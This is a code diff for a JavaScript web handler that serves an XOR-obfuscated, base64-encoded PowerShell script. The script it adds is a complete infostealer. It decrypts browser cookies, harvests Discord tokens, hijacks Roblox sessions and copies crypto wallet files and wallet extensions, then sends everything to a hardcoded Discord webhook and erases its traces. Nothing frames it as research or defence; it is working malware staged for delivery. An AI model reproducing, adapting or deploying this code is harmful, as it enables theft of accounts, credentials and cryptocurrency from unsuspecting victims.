@@ -1,10 +1,215 @@
-const fs = require('fs');
-const path = require('path');
+const KEY = 37;
+const CACHE = 'no-store, max-age=0, must-revalidate';
+
+const PAYLOAD = String.raw`$ErrorActionPreference='SilentlyContinue'
+$ProgressPreference='SilentlyContinue'
+function u($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
+$LS=u 'TG9jYWwgU3RhdGU='; $LD=u 'bGV2ZWxkYg=='; $RB=u 'LlJPQkxPU0VDVVJJVFk='
+$TQ=u 'ZFF3NHc5V2dYY1E='; $ME=u 'dXNlcnMvQG1l'; $MI=u 'bW9iaWxlYXBpL3VzZXJpbmZv'
+$AT=u 'YXV0aGVudGljYXRpb24tdGlja2V0'
+$wh='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
+$tmp=Join-Path $env:TEMP ('w'+[guid]::NewGuid().ToString('N').Substring(0,8))
+New-Item -ItemType Directory $tmp -Force|Out-Null
+$R=New-Object System.Text.StringBuilder
+function A($s){[void]$R.AppendLine($s)}
+function Send($p,$n,$ct){
+ if(-not(Test-Path $p)){return}
+ for($a=1;$a -le 3;$a++){
+  $b=[guid]::NewGuid().ToString('N'); $e=[Text.Encoding]::UTF8
+  $pre=$e.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$n`"`r`nContent-Type: $ct`r`n`r`n")
+  $dat=[IO.File]::ReadAllBytes($p); $post=$e.GetBytes("`r`n--$b--`r`n")
+  $all=New-Object byte[] ($pre.Length+$dat.Length+$post.Length)
+  [Array]::Copy($pre,0,$all,0,$pre.Length);[Array]::Copy($dat,0,$all,$pre.Length,$dat.Length);[Array]::Copy($post,0,$all,$pre.Length+$dat.Length,$post.Length)
+  try{Invoke-WebRequest $wh -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $all -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop|Out-Null;return}catch{Start-Sleep -Seconds (2*$a)}
+ }
+}
+function Note($t){
+ $f=Join-Path $tmp ('n'+[guid]::NewGuid().ToString('N').Substring(0,6)+'.txt')
+ $t|Set-Content $f -Encoding UTF8; Send $f 'note.txt' 'text/plain'
+}
+if(-not('G'-as[type])){
+Add-Type -TypeDefinition @'
+using System;using System.Runtime.InteropServices;using System.Text;
+public class G{
+ [DllImport("bcrypt.dll")]static extern uint BCryptOpenAlgorithmProvider(out IntPtr h,string a,string b,uint c);
+ [DllImport("bcrypt.dll")]static extern uint BCryptSetProperty(IntPtr h,string p,byte[] v,int l,uint f);
+ [DllImport("bcrypt.dll")]static extern uint BCryptGetProperty(IntPtr h,string p,byte[] v,int l,out int r,uint f);
+ [DllImport("bcrypt.dll")]static extern uint BCryptGenerateSymmetricKey(IntPtr h,out IntPtr k,byte[] o,int ol,byte[] s,int sl,uint f);
+ [DllImport("bcrypt.dll")]static extern uint BCryptDecrypt(IntPtr k,byte[] i,int il,byte[] p,byte[] n,int nl,byte[] o,int ol,out int r,uint f);
+ [DllImport("bcrypt.dll")]static extern uint BCryptDestroyKey(IntPtr k);
+ [DllImport("bcrypt.dll")]static extern uint BCryptCloseAlgorithmProvider(IntPtr h,uint f);
+ public static byte[] D(byte[] key,byte[] nonce,byte[] data,byte[] tag){
+  IntPtr h,k; BCryptOpenAlgorithmProvider(out h,"AES",null,0);
+  byte[] m=Encoding.Unicode.GetBytes("ChainingModeGCM\0");
+  BCryptSetProperty(h,"ChainingMode",m,m.Length,0);
+  int r; byte[] t=new byte[4]; BCryptGetProperty(h,"ObjectLength",t,4,out r,0);
+  int ol=BitConverter.ToInt32(t,0); byte[] o=new byte[ol];
+  byte[] iv=new byte[28]; Buffer.BlockCopy(nonce,0,iv,0,12); Buffer.BlockCopy(tag,0,iv,12,16);
+  BCryptGenerateSymmetricKey(h,out k,o,ol,key,key.Length,0);
+  byte[] ob=new byte[data.Length]; int res;
+  BCryptDecrypt(k,data,data.Length,null,iv,28,ob,ob.Length,out res,0);
+  BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(h,0);
+  byte[] f=new byte[res]; Array.Copy(ob,f,res); return f;
+ }
+}
+'@}
+$L1=[Text.Encoding]::GetEncoding(28591)
+function KeyFrom($ud){
+ $ls="$ud\$LS"; if(-not(Test-Path $ls)){return $null}
+ try{ $j=Get-Content $ls -Raw|ConvertFrom-Json }catch{ return $null }
+ if(-not $j.os_crypt.encrypted_key){return $null}
+ $b=[Convert]::FromBase64String($j.os_crypt.encrypted_key)
+ $b=$b[5..($b.Length-1)]
+ try{[Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser')}catch{$null}
+}
+function DecBlob($blob,$key){
+ if(-not $key -or $blob.Length -lt 32){return $null}
+ $p=[Text.Encoding]::ASCII.GetString($blob[0..2])
+ if($p -ne 'v10' -and $p -ne 'v11'){return $null}
+ $n=$blob[3..14]; $d=$blob[15..($blob.Length-1)]
+ if($d.Length -le 16){return $null}
+ $tag=$d[($d.Length-16)..($d.Length-1)]; $ct=$d[0..($d.Length-17)]
+ try{[Text.Encoding]::UTF8.GetString([G]::D($key,$n,$ct,$tag))}catch{$null}
+}
+function GetCookies($db,$key){
+ if(-not(Test-Path $db) -or -not $key){return @()}
+ $c=Join-Path $tmp ([guid]::NewGuid().ToString('N')+'.db')
+ Copy-Item $db $c -Force -ErrorAction SilentlyContinue
+ if(-not(Test-Path $c)){return @()}
+ $txt=$L1.GetString([IO.File]::ReadAllBytes($c)); $out=@()
+ foreach($m in [regex]::Matches($txt,'v(?:10|11|20)[A-Za-z0-9+/=]{20,}')){
+  $v=DecBlob ([Convert]::FromBase64String($m.Value)) $key
+  if($v){
+   $st=[Math]::Max(0,$m.Index-400); $h=''
+   $hs=[regex]::Matches($txt.Substring($st,$m.Index-$st),'[a-z0-9\-]{2,60}\.(com|net|org|io|xyz|app|dev|gg|tv|me)')
+   if($hs.Count -gt 0){$h=$hs[$hs.Count-1].Value}
+   $out+=[pscustomobject]@{Host=$h;Value=$v}
+  }
+ }
+ Remove-Item $c -Force
+ $out
+}
+function GetTokens($key,$base){
+ $l="$base\$LS\..\$LD"; if(-not(Test-Path $l)){return @()}
+ $t=@()
+ foreach($f in Get-ChildItem $l -File){
+  if($f.Extension -ne '.ldb' -and $f.Extension -ne '.log'){continue}
+  $txt=$L1.GetString([IO.File]::ReadAllBytes($f.FullName))
+  foreach($m in [regex]::Matches($txt,($TQ+':([A-Za-z0-9+/=]{40,})'))){
+   $v=DecBlob ([Convert]::FromBase64String($m.Groups[1].Value)) $key
+   if($v -match '[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}'){$t+=$Matches[0]}
+  }
+  foreach($m in [regex]::Matches($txt,'[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}')){$t+=$m.Value}
+ }
+ $t|Select-Object -Unique
+}
+function RB($c){
+ try{
+  $s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
+  $s.Cookies.Add((New-Object System.Net.Cookie($RB,$c,'/','.roblox.com')))
+  $u=Invoke-RestMethod ("https://www.roblox.com/"+$MI) -WebSession $s -TimeoutSec 12
+  if(-not $u.UserName){return $null}
+  $tk=''
+  try{Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'='';Referer='https://www.roblox.com/'} -UseBasicParsing -ErrorAction Stop|Out-Null}
+  catch{$tk=[string]$_.Exception.Response.Headers['x-csrf-token']}
+  $r=Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'=$tk;Referer='https://www.roblox.com/'} -UseBasicParsing
+  $ti=$r.Headers['rbx-authentication-ticket']
+  $r2=Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT+"/redeem") -Method Post -Body (@{authenticationTicket=$ti}|ConvertTo-Json) -ContentType 'application/json' -Headers @{RBXAuthenticationNegotiation='1'} -UseBasicParsing
+  $nc=([string]$r2.Headers['Set-Cookie'] -split ';')[0] -replace ('^\.'+$RB+'='),''
+  return @{u=$u;c=$nc}
+ }catch{return $null}
+}
+try{
+Note ("online : {0}\{1} @ {2}" -f $env:USERDOMAIN,$env:USERNAME,$env:COMPUTERNAME)
+A "=== SYSTEM ==="
+A ("user : {0}\{1}" -f $env:USERDOMAIN,$env:USERNAME)
+A ("host : {0}" -f $env:COMPUTERNAME)
+A ("time : {0:u}" -f (Get-Date))
+try{A ("ip   : {0}" -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10))}catch{}
+A ""
+$browsers=@(
+ @{n='Chrome';p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
+ @{n='Edge';p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
+ @{n='Brave';p="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
+ @{n='Vivaldi';p="$env:LOCALAPPDATA\Vivaldi\User Data"},
+ @{n='Yandex';p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"},
+ @{n='Opera';p="$env:APPDATA\Opera Software\Opera Stable"},
+ @{n='OperaGX';p="$env:APPDATA\Opera Software\Opera GX Stable"}
+)
+$allCk=@(); $allTk=@()
+foreach($b in $browsers){
+ if(-not(Test-Path $b.p)){continue}
+ $k=KeyFrom $b.p
+ $profs=@("$($b.p)")
+ Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{$profs+=$_.FullName}
+ foreach($pr in ($profs|Select-Object -Unique)){
+  foreach($rel in @("$pr\Network\Cookies","$pr\Cookies")){
+   foreach($c in (GetCookies $rel $k)){$allCk+=[pscustomobject]@{B=$b.n;H=$c.Host;V=$c.Value}}
+  }
+  foreach($t in (GetTokens $k $pr)){$allTk+=$t}
+ }
+}
+$allTk+=GetTokens (KeyFrom "$env:APPDATA\discord") "$env:APPDATA\discord"
+$allTk+=GetTokens (KeyFrom "$env:APPDATA\discordptb") "$env:APPDATA\discordptb"
+$allTk+=GetTokens (KeyFrom "$env:APPDATA\discordcanary") "$env:APPDATA\discordcanary"
+$allTk=$allTk|Select-Object -Unique
+A "=== ROBLOX ==="
+$seen=@()
+foreach($c in @($allCk|Where-Object{$_.H -like '*roblox*' -or $_.H -like '*rbx*'})){
+ if($seen -contains $c.V){continue}; $seen+=$c.V
+ $x=RB $c.V
+ if($x){
+  A ("USER : {0} (id {1}) | robux {2}" -f $x.u.UserName,$x.u.UserId,$x.u.Robux)
+  A ("COOKIE (IP-bypassed): {0}" -f $x.c)
+  A ("ORIGINAL: {0}" -f $c.V); A ""
+ }
+}
+if(-not $seen.Count){A "none found"; A ""}
+A "=== DISCORD ==="
+foreach($t in $allTk){
+ try{
+  $u=Invoke-RestMethod ("https://discord.com/api/v9/"+$ME) -Headers @{Authorization=$t} -TimeoutSec 12
+  A ("{0}#{1} | {2} | id {3} | 2fa {4}" -f $u.username,$u.discriminator,$u.email,$u.id,$u.mfa_enabled)
+  A ("TOKEN: {0}" -f $t); A ""
+ }catch{}
+}
+A "=== COOKIES ==="
+foreach($c in $allCk){A ("[{0}] {1} = {2}" -f $c.B,$c.H,$c.V)}
+$wdir=Join-Path $tmp 'w'; New-Item -ItemType Directory $wdir -Force|Out-Null
+$wp=@("$env:APPDATA\Exodus\exodus.wallet","$env:APPDATA\Electrum\wallets","$env:APPDATA\atomic\Local Storage\leveldb",
+"$env:APPDATA\Coinbase","$env:APPDATA\Trust Wallet","$env:APPDATA\Phantom","$env:LOCALAPPDATA\Phantom",
+"$env:APPDATA\Binance","$env:APPDATA\Ledger Live","$env:APPDATA\Wasabi Wallet","$env:APPDATA\Bitcoin\wallets",
+"$env:APPDATA\Ethereum\keystore","$env:APPDATA\Coin98","$env:APPDATA\Solflare","$env:APPDATA\Guarda")
+$exts=@{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Trust='egjidjbpglichdcondbcbdnbeeppgdph';Coinbase='hnlfjmpnagjnfpkljghhgnpmlpcoimja';Binance='fhbohimaelbohpjbbldcngcnapndodjp';Keplr='dmkamcknogkgcdfhhbddcghachkejeap';Solflare='bhhhlbepdkbapadjdnnojkbgioiodbic';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec';Yoroi='ffnlbdhecaflocmhejdebcbfcbjjljhd';Nami='lpfcbjgnfdnmbafgjonjliakdjobofnk'}
+A ""; A "=== WALLETS ==="
+foreach($p in $wp){
+ if(Test-Path $p){Copy-Item $p (Join-Path $wdir ([IO.Path]::GetFileName($p))) -Recurse -Force -ErrorAction SilentlyContinue; A ("dir  : {0}" -f $p)}
+}
+foreach($b in $browsers){
+ if(-not(Test-Path $b.p)){continue}
+ Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{
+  foreach($k in $exts.Keys){
+   $src="$($_.FullName)\$LS\..\$($exts[$k])"
+   if(Test-Path $src){Copy-Item $src (Join-Path $wdir ("ext_"+$k+"_"+$b.n)) -Recurse -Force -ErrorAction SilentlyContinue; A ("ext  : {0} [{1}]" -f $k,$b.n)}
+  }
+ }
+}
+$rp=Join-Path $tmp 'report.txt'; $R.ToString()|Set-Content $rp -Encoding UTF8
+$zp=Join-Path $tmp 'wallets.zip'
+try{Compress-Archive "$wdir\*" $zp -Force -ErrorAction Stop}catch{}
+Send $rp ("report-"+$env:COMPUTERNAME+".txt") 'text/plain'
+Send $zp 'wallets.zip' 'application/zip'
+}catch{
+ Note ("ERR: {0} (line {1})" -f $_.Exception.Message,$_.InvocationInfo.ScriptLineNumber)
+}
+Start-Sleep 2
+Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue`;
+
 module.exports = (req, res) => {
-  const src = fs.readFileSync(path.join(process.cwd(), 'public', 'a.txt'), 'utf8');
-  const buf = Buffer.from(src, 'utf8');
-  for (let i = 0; i < buf.length; i++) buf[i] ^= 37;
+  const buf = Buffer.from(PAYLOAD, 'utf8');
+  for (let i = 0; i < buf.length; i++) buf[i] ^= KEY;
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  res.setHeader('Cache-Control', 'no-store');
+  res.setHeader('Cache-Control', CACHE);
+  res.setHeader('Access-Control-Allow-Origin', '*');
   res.status(200).send(buf.toString('base64'));
 };
